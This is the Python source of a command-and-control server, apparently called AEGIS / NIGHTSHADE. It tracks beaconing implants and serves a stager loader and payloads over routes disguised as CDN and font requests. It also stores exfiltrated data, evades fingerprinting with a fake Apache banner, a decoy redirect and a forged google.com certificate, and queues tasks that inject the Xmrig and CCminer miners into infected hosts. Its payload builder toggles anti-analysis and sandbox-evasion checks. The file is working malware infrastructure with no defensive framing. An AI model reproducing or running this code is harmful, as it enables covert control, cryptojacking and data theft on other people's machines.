import http.server
import ssl
import json
import threading
import struct
import time
import os
import sys
import base64
import random
import re
import errno
from urllib.parse import urlparse, parse_qs
from datetime import datetime

# Import our config editor
import config_editor

# Global State
AGENTS = {}  # {node_id_hex: {"last_seen": timestamp, "info": {...}, "tasks": []}}
ACTIVE_AGENT = None
SERVER_RUNNING = True
HTTPD_INSTANCE = None # Keep track of the server instance to shut it down properly

# ── Resolve absolute path to project root ─────────────────────────────────
# This ensures the server works regardless of which directory it's launched from.
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.abspath(os.path.join(SCRIPT_DIR, ".."))

# Colors for TUI
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# ── C2 Envelope structure (must match c2_client.h) ────────────────────────
#
#  typedef struct {
#    uint32_t magic;        // 0xAE610C2D
#    uint32_t msg_type;
#    uint32_t payload_len;
#    uint32_t sequence;
#    uint8_t  iv[12];
#    uint8_t  tag[16];
#    uint8_t  node_id[16];
#  } AEGIS_PACKED aegis_c2_envelope_t;
#
# Total: 4+4+4+4+12+16+16 = 60 bytes

ENVELOPE_FMT = "<IIII12s16s16s"   # little-endian, packed
ENVELOPE_SIZE = struct.calcsize(ENVELOPE_FMT)
C2_MAGIC = 0xAE610C2D

# Message types (from c2_client.h)
C2_MSG_BEACON       = 0x01
C2_MSG_TASK_REQ     = 0x02
C2_MSG_TASK_RESP    = 0x03
C2_MSG_PAYLOAD_REQ  = 0x04
C2_MSG_PAYLOAD_DATA = 0x05
C2_MSG_REKEY        = 0x06
C2_MSG_STAGE_REQ    = 0x07
C2_MSG_STAGE_DATA   = 0x08
C2_MSG_EXFIL        = 0x09
C2_MSG_HEARTBEAT    = 0x0A
C2_MSG_RESOURCE_REQ = 0x0B

def parse_envelope(data):
    """Parse a C2 envelope from raw bytes. Returns (envelope_dict, ciphertext) or (None, None)."""
    if len(data) < ENVELOPE_SIZE:
        return None, None

    magic, msg_type, payload_len, sequence, iv, tag, node_id = \
        struct.unpack(ENVELOPE_FMT, data[:ENVELOPE_SIZE])

    if magic != C2_MAGIC:
        return None, None

    env = {
        "magic": magic,
        "msg_type": msg_type,
        "payload_len": payload_len,
        "sequence": sequence,
        "iv": iv,
        "tag": tag,
        "node_id": node_id,
        "node_id_hex": node_id.hex(),
    }

    ciphertext = data[ENVELOPE_SIZE:]
    return env, ciphertext


# --- C2 Logic -------------------------------------------------------------

class ReusableHTTPServer(http.server.HTTPServer):
    allow_reuse_address = True

class AegisC2Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppress default logging to keep CLI clean
        pass

    def version_string(self):
        # Override default server version string to prevent fingerprinting
        return "Apache"

    def do_GET(self):
        # ── Health Check ──────────────────────────────────────────────────
        if self.path == '/health':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()

            status = {
                "status": "active",
                "uptime": "TODO", # Ideally track start time
                "agents_online": len(AGENTS),
                "timestamp": datetime.now().isoformat(),
                "config": {
                    "primary_host": config_editor.get_config_value("AEGIS_C2_PRIMARY_HOST"),
                    "primary_port": config_editor.get_config_value("AEGIS_C2_PRIMARY_PORT"),
                }
            }
            self.wfile.write(json.dumps(status, indent=2).encode())
            return

        # Handle GET requests (e.g. browser/curl probes) gracefully
        # Return a decoy redirect to a benign site
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com')
        self.end_headers()

    def do_POST(self):
        path = self.path

        content_len = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_len) if content_len > 0 else b""

        response_body = b""

        # ── Route: Beacon (/api/v1/assets/XXXXXXXX/upload) ────────────────
        beacon_match = re.search(r'/api/v1/assets/([0-9a-fA-F]+)/upload', path)

        # ── Route: Stage request (/cdn/dist/XXXXXXXX/bundle.js) ───────────
        stage_match = re.search(r'/cdn/dist/([0-9a-fA-F]+)/bundle\.js', path)

        # ── Route: Resource fetch (/cdn/assets/RESOURCE_ID) ───────────────
        resource_match = re.search(r'/cdn/assets/([^/]+)', path)

        # ── Route: Payload request (/static/fonts/XXXXXXXX.woff2) ─────────
        payload_match = re.search(r'/static/fonts/([0-9a-fA-F]+)\.woff2', path)

        # ── Route: Exfiltration (/api/telemetry/XXXXXXXX) ─────────────────
        exfil_match = re.search(r'/api/telemetry/([0-9a-fA-F]+)', path)

        if beacon_match:
            response_body = self._handle_beacon(post_body)
        elif stage_match:
            response_body = self._handle_stage_req(post_body)
        elif resource_match:
            resource_id = resource_match.group(1)
            response_body = self._handle_resource_req(resource_id)
        elif payload_match:
            response_body = self._handle_payload_req(post_body)
        elif exfil_match:
            self._handle_exfil(post_body)
            response_body = b""
        else:
            # Unknown route — log it
            print(f"{Colors.WARNING}[?] Unknown POST route: {path}{Colors.ENDC}")

        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Connection', 'close')
        self.end_headers()
        self.wfile.write(response_body)

    def _handle_beacon(self, data):
        """
        Process a beacon from the stager/agent.
        Extracts the node_id from the envelope header (unencrypted portion)
        and registers/updates the agent in our tracking table.
        """
        client_ip = self.client_address[0]
        env, ct = parse_envelope(data)

        if env:
            node_id_hex = env["node_id_hex"]
            seq = env["sequence"]
            msg_type = env["msg_type"]

            # Use first 8 hex chars for display
            short_id = node_id_hex[:8]

            if node_id_hex not in AGENTS:
                AGENTS[node_id_hex] = {
                    "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "ip": client_ip,
                    "info": {},
                    "tasks": [],
                    "sequence": seq,
                }
                print(f"{Colors.GREEN}[+] New Agent: {short_id} from {client_ip} (seq={seq}){Colors.ENDC}")
            else:
                print(f"{Colors.CYAN}[~] Beacon: {short_id} from {client_ip} (seq={seq}){Colors.ENDC}")

            agent = AGENTS[node_id_hex]
            agent["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            agent["ip"] = client_ip
            agent["sequence"] = seq

            # If we have pending tasks for this agent, we should encode them
            # in the response. For now, we acknowledge but note that full
            # crypto-matching requires the shared PSK implementation.
            if agent["tasks"]:
                # Pop all pending tasks and log them
                tasks = agent["tasks"]
                print(f"{Colors.WARNING}  └─ {len(tasks)} pending task(s) for {short_id}{Colors.ENDC}")
                # In a production implementation, these would be encrypted with
                # the session key and packed into a response envelope.
                # For the prototype, we clear them after acknowledging.
                agent["tasks"] = []
        else:
            # Couldn't parse envelope — might be an old client or garbled data.
            # Fall back to IP-based tracking.
            print(f"{Colors.WARNING}[?] Beacon from {client_ip} with unparseable envelope ({len(data)} bytes){Colors.ENDC}")

            existing_id = None
            for aid, info in AGENTS.items():
                if info.get("ip") == client_ip:
                    existing_id = aid
                    break

            if not existing_id:
                fallback_id = f"unknown_{client_ip.replace('.', '_')}"
                AGENTS[fallback_id] = {
                    "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "ip": client_ip,
                    "info": {"hostname": "unknown", "user": "unknown"},
                    "tasks": []
                }
                existing_id = fallback_id

            AGENTS[existing_id]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        return b""

    def _handle_stage_req(self, data):
        """
        Handle a stage request — the stager is asking for the Ghost Loader binary.
        Look for the ghost loader in the build directory.
        """
        client_ip = self.client_address[0]
        env, ct = parse_envelope(data)

        short_id = "unknown"
        if env:
            short_id = env["node_id_hex"][:8]

        print(f"{Colors.BLUE}[⬇] Stage request from {short_id} ({client_ip}){Colors.ENDC}")

        # Look for the ghost loader binary in known locations
        ghost_paths = [
            os.path.join(PROJECT_ROOT, "build", "aegis_ghost_loader"),
            os.path.join(PROJECT_ROOT, "payloads", "ghost_loader"),
            os.path.join(PROJECT_ROOT, "build", "ghost_loader"),
        ]

        for gpath in ghost_paths:
            if os.path.exists(gpath):
                with open(gpath, "rb") as f:
                    ghost_data = f.read()
                print(f"{Colors.GREEN}  └─ Serving ghost loader: {gpath} ({len(ghost_data)} bytes){Colors.ENDC}")
                # In production, this would be wrapped in an encrypted envelope.
                # The raw binary is returned for the prototype.
                return ghost_data

        print(f"{Colors.FAIL}  └─ Ghost loader not found in any known path!{Colors.ENDC}")
        print(f"{Colors.FAIL}     Searched: {', '.join(ghost_paths)}{Colors.ENDC}")
        print(f"{Colors.WARNING}     Build it with: make ghost_loader{Colors.ENDC}")
        return b""

    def _handle_resource_req(self, resource_id):
        """Serve a requested resource (ELF binary, payload, etc.) from the payloads directory."""
        payloads_dir = os.path.join(PROJECT_ROOT, "payloads")
        path = os.path.join(payloads_dir, resource_id)

        if os.path.exists(path):
            with open(path, "rb") as f:
                data = f.read()
            print(f"{Colors.GREEN}[⬇] Serving resource: {resource_id} ({len(data)} bytes){Colors.ENDC}")
            return data

        print(f"{Colors.FAIL}[!] Resource not found: {resource_id}{Colors.ENDC}")
        return b""

    def _handle_payload_req(self, data):
        """Handle a payload module request from the Nanomachine."""
        client_ip = self.client_address[0]
        env, ct = parse_envelope(data)

        short_id = "unknown"
        if env:
            short_id = env["node_id_hex"][:8]

        print(f"{Colors.BLUE}[⬇] Payload request from {short_id} ({client_ip}){Colors.ENDC}")

        # Check for a default payload in the payloads directory
        payloads_dir = os.path.join(PROJECT_ROOT, "payloads")
        if os.path.exists(payloads_dir):
            payloads = os.listdir(payloads_dir)
            if payloads:
                # Return the first available payload
                ppath = os.path.join(payloads_dir, payloads[0])
                with open(ppath, "rb") as f:
                    payload_data = f.read()
                print(f"{Colors.GREEN}  └─ Serving payload: {payloads[0]} ({len(payload_data)} bytes){Colors.ENDC}")
                return payload_data

        print(f"{Colors.FAIL}  └─ No payloads available{Colors.ENDC}")
        return b""

    def _handle_exfil(self, data):
        """Log exfiltrated data from the agent."""
        client_ip = self.client_address[0]
        env, ct = parse_envelope(data)

        short_id = "unknown"
        if env:
            short_id = env["node_id_hex"][:8]

        print(f"{Colors.WARNING}[📤] Exfil received from {short_id} ({client_ip}): {len(data)} bytes{Colors.ENDC}")

        # Write to exfil directory for inspection
        exfil_dir = os.path.join(PROJECT_ROOT, "exfil")
        os.makedirs(exfil_dir, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        exfil_path = os.path.join(exfil_dir, f"{short_id}_{ts}.bin")
        with open(exfil_path, "wb") as f:
            f.write(data)
        print(f"{Colors.CYAN}  └─ Saved to {exfil_path}{Colors.ENDC}")


def run_server(port=443):
    global HTTPD_INSTANCE
    # Use absolute paths for SSL certs
    cert_path = os.path.join(PROJECT_ROOT, "server.pem")

    # Ensure SSL certs exist
    if not os.path.exists(cert_path):
        os.system(f"openssl req -new -x509 -keyout {cert_path} -out {cert_path} -days 365 -nodes -subj '/CN=www.google.com'")

    print(f"{Colors.GREEN}[+] Starting C2 Server on 0.0.0.0:{port}...{Colors.ENDC}")
    print(f"{Colors.CYAN}    SSL cert: {cert_path}{Colors.ENDC}")
    print(f"{Colors.CYAN}    Payloads: {os.path.join(PROJECT_ROOT, 'payloads')}{Colors.ENDC}")
    print(f"{Colors.CYAN}    Project:  {PROJECT_ROOT}{Colors.ENDC}")

    server_address = ('0.0.0.0', port)

    try:
        httpd = ReusableHTTPServer(server_address, AegisC2Handler)
        HTTPD_INSTANCE = httpd
    except OSError as e:
        if e.errno == errno.EADDRINUSE:
            print(f"{Colors.FAIL}[!] Error: Port {port} is already in use. C2 Server thread failed to bind.{Colors.ENDC}")
            print(f"{Colors.WARNING}    Try: sudo lsof -i :{port}  OR  sudo kill $(sudo lsof -t -i :{port}){Colors.ENDC}")
            return
        else:
            raise e

    # Wrap with SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=cert_path)
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

    print(f"{Colors.GREEN}[+] C2 Listener active. Waiting for beacons...{Colors.ENDC}")

    while SERVER_RUNNING:
        try:
            httpd.handle_request()
        except Exception:
            pass

# --- TUI Logic ------------------------------------------------------------

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    print(f"{Colors.HEADER}")
    print(r"""
    ███████╗███╗   ██╗██╗
    ██╔════╝████╗  ██║██║
    █████╗  ██╔██╗ ██║██║
    ██╔══╝  ██║╚██╗██║██║
    ███████╗██║ ╚████║██║
    ╚══════╝╚═╝  ╚═══╝╚═╝
    AEGIS / NIGHTSHADE C2
    """)
    print(f"{Colors.ENDC}")

def menu_main():
    print(f"{Colors.BOLD}=== Main Menu ==={Colors.ENDC}")
    print("[1] List Agents")
    print("[2] Interact with Agent")
    print("[3] Payload Builder (Anti-Analysis Config)")
    print("[4] Advanced Configuration")
    print("[5] Start Listener (Background)")
    print("[0] Exit")
    print()

def menu_builder():
    while True:
        print_banner()
        print(f"{Colors.BOLD}=== Payload Builder ==={Colors.ENDC}")

        settings = config_editor.get_aa_settings()

        print(f"Anti-Analysis Checks:")
        for key, enabled in settings.items():
            status = f"{Colors.GREEN}ON{Colors.ENDC}" if enabled else f"{Colors.FAIL}OFF{Colors.ENDC}"
            name = key.replace("AEGIS_AA_ENABLE_", "")
            print(f"  {name:<20} : {status}")

        print()
        print("[1] Toggle Check...")
        print("[2] Build Stager (Standard)")
        print("[3] Build Stager (CLEAN / No-AA)")
        print("[0] Back")

        choice = input("Select > ")

        if choice == '1':
            key_suffix = input("Enter check name (e.g. PTRACE): ").upper()
            full_key = f"AEGIS_AA_ENABLE_{key_suffix}"
            if full_key in settings:
                config_editor.toggle_setting(full_key, not settings[full_key])
            else:
                print("Unknown check.")
                time.sleep(1)
        elif choice == '2':
            os.system(f"make -C {PROJECT_ROOT} clean && make -C {PROJECT_ROOT} stager")
            input("Build complete. Press Enter.")
        elif choice == '3':
            os.system(f"make -C {PROJECT_ROOT} clean && make -C {PROJECT_ROOT} stager CFLAGS+=-DAEGIS_DISABLE_AA")
            input("Clean Build complete. Press Enter.")
        elif choice == '0':
            break

def menu_advanced_config():
    while True:
        print_banner()
        print(f"{Colors.BOLD}=== Advanced Configuration ==={Colors.ENDC}")

        params = [
            "AEGIS_AA_RDTSC_THRESHOLD",
            "AEGIS_AA_SLEEP_CHECK_MS",
            "AEGIS_AA_MIN_CPU_CORES",
            "AEGIS_AA_MIN_RAM_MB",
            "AEGIS_AA_MIN_DISK_GB",
            "AEGIS_AA_MIN_UPTIME_SEC",
            "AEGIS_BEACON_INTERVAL_MS",
            "AEGIS_C2_PRIMARY_HOST",
            "AEGIS_C2_PRIMARY_PORT",
        ]

        for p in params:
            val = config_editor.get_config_value(p)
            print(f"  {p:<30} : {val}")

        print()
        print("[1] Edit Parameter")
        print("[0] Back")

        choice = input("Select > ")
        if choice == '1':
            param = input("Parameter Name: ")
            if config_editor.get_config_value(param) is None:
                print("Parameter not found.")
                time.sleep(1)
                continue
            new_val = input("New Value: ")
            config_editor.set_config_value(param, new_val)
            print("Updated.")
            time.sleep(0.5)
        elif choice == '0':
            break

def menu_interact():
    if not AGENTS:
        print("No agents connected.")
        time.sleep(1)
        return

    print("Active Agents:")
    agent_list = []
    for idx, (aid, info) in enumerate(AGENTS.items()):
        short_id = aid[:8] if len(aid) > 8 else aid
        last_seen = info.get('last_seen', 'never')
        ip = info.get('ip', 'unknown')
        print(f"  [{idx}] {short_id} ({ip}) Last Seen: {last_seen}")
        agent_list.append(aid)

    try:
        target_idx = int(input("Enter Agent Index > "))
        if target_idx < 0 or target_idx >= len(agent_list):
            print("Invalid index.")
            return
        target = agent_list[target_idx]
    except (ValueError, IndexError):
        return

    short_target = target[:8] if len(target) > 8 else target

    while True:
        print_banner()
        print(f"{Colors.BLUE}Interacting with {short_target} ({AGENTS[target]['ip']}){Colors.ENDC}")
        print("[1] Task: Execute Command (Shellcode/ELF)")
        print("[2] Task: Inject Payload (Xmrig/CCminer)")
        print("[0] Back")

        choice = input("Select > ")
        if choice == '1':
            cmd = input("Resource ID to execute (e.g. 'xmrig'): ")
            AGENTS[target]["tasks"].append(f"exec {cmd}")
            print(f"Task queued for {short_target}")
            time.sleep(1)
        elif choice == '2':
            print("Available payloads in /payloads/:")
            payloads_dir = os.path.join(PROJECT_ROOT, "payloads")
            try:
                for f in os.listdir(payloads_dir):
                    fpath = os.path.join(payloads_dir, f)
                    fsize = os.path.getsize(fpath)
                    print(f"  - {f} ({fsize} bytes)")
            except FileNotFoundError:
                print("  (No payloads directory found)")

            p = input("Payload name > ")
            AGENTS[target]["tasks"].append(f"exec {p}")
            print("Injection task queued.")
            time.sleep(1)
        elif choice == '0':
            break

def main_loop():
    global SERVER_RUNNING

    # Get configured port from config.h
    port_str = config_editor.get_config_value("AEGIS_C2_PRIMARY_PORT")
    c2_port = int(port_str) if port_str and port_str.isdigit() else 4443

    print(f"{Colors.CYAN}[*] C2 Port from config.h: {c2_port}{Colors.ENDC}")

    # Auto-start listener thread
    t = threading.Thread(target=run_server, args=(c2_port,))
    t.daemon = True
    t.start()

    # Give the server a moment to bind
    time.sleep(1)

    while True:
        print_banner()
        menu_main()
        choice = input("Select > ")

        if choice == '1':
            if not AGENTS:
                print("No agents.")
            else:
                print(f"{'ID':<12} {'IP':<18} {'First Seen':<22} {'Last Seen':<22}")
                print("-" * 74)
                for aid, info in AGENTS.items():
                    short_id = aid[:8] if len(aid) > 8 else aid
                    print(f"{short_id:<12} {info.get('ip', '?'):<18} {info.get('first_seen', '?'):<22} {info.get('last_seen', '?'):<22}")
            input("Press Enter...")
        elif choice == '2':
            menu_interact()
        elif choice == '3':
            menu_builder()
        elif choice == '4':
            menu_advanced_config()
        elif choice == '5':
            print(f"Listener is already running on port {c2_port} (background).")
            time.sleep(1)
        elif choice == '0':
            SERVER_RUNNING = False
            # Proper shutdown
            if HTTPD_INSTANCE:
                HTTPD_INSTANCE.shutdown()
                HTTPD_INSTANCE.server_close()
            sys.exit(0)

if __name__ == "__main__":
    # Create payloads dir if missing
    payloads_dir = os.path.join(PROJECT_ROOT, "payloads")
    if not os.path.exists(payloads_dir):
        os.makedirs(payloads_dir)

    try:
        main_loop()
    except KeyboardInterrupt:
        SERVER_RUNNING = False
        if HTTPD_INSTANCE:
            HTTPD_INSTANCE.shutdown()
            HTTPD_INSTANCE.server_close()
        print("\nExiting...")
